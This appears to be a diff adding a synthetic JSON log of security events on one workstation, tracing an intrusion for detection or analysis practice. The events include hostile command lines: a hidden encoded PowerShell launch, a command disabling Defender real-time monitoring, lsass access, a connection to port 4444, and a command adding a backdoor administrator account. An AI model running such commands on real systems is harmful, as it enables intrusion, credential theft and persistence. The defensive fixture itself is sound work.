@@ -1,1 +1,74 @@
-
+[
+  {
+    "id": "A-1001",
+    "timestamp": "2026-02-10T14:02:00Z",
+    "host": "WKS-FIN-07",
+    "user": "jdoe",
+    "event_type": "authentication",
+    "details": {"result": "success", "prior_failed_attempts": 8, "source_ip": "203.0.113.44"}
+  },
+  {
+    "id": "A-1002",
+    "timestamp": "2026-02-10T14:05:00Z",
+    "host": "WKS-FIN-07",
+    "user": "jdoe",
+    "event_type": "process_creation",
+    "details": {
+      "process_name": "powershell.exe",
+      "parent_process": "cmd.exe",
+      "command_line": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."
+    }
+  },
+  {
+    "id": "A-1003",
+    "timestamp": "2026-02-10T14:08:00Z",
+    "host": "WKS-FIN-07",
+    "user": "jdoe",
+    "event_type": "process_creation",
+    "details": {
+      "process_name": "cmd.exe",
+      "parent_process": "powershell.exe",
+      "command_line": "whoami /all"
+    }
+  },
+  {
+    "id": "A-1004",
+    "timestamp": "2026-02-10T14:11:00Z",
+    "host": "WKS-FIN-07",
+    "user": "jdoe",
+    "event_type": "process_creation",
+    "details": {
+      "process_name": "powershell.exe",
+      "parent_process": "powershell.exe",
+      "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true"
+    }
+  },
+  {
+    "id": "A-1005",
+    "timestamp": "2026-02-10T14:14:00Z",
+    "host": "WKS-FIN-07",
+    "user": "SYSTEM",
+    "event_type": "process_access",
+    "details": {"source_process": "powershell.exe", "target_process": "lsass.exe"}
+  },
+  {
+    "id": "A-1006",
+    "timestamp": "2026-02-10T14:20:00Z",
+    "host": "WKS-FIN-07",
+    "user": "jdoe",
+    "event_type": "network_connection",
+    "details": {"dest_ip": "198.51.100.23", "dest_port": 4444, "dest_reputation": "malicious"}
+  },
+  {
+    "id": "A-1007",
+    "timestamp": "2026-02-10T14:30:00Z",
+    "host": "WKS-FIN-07",
+    "user": "jdoe",
+    "event_type": "process_creation",
+    "details": {
+      "process_name": "cmd.exe",
+      "parent_process": "powershell.exe",
+      "command_line": "net localgroup administrators jdoe_backup /add"
+    }
+  }
+]
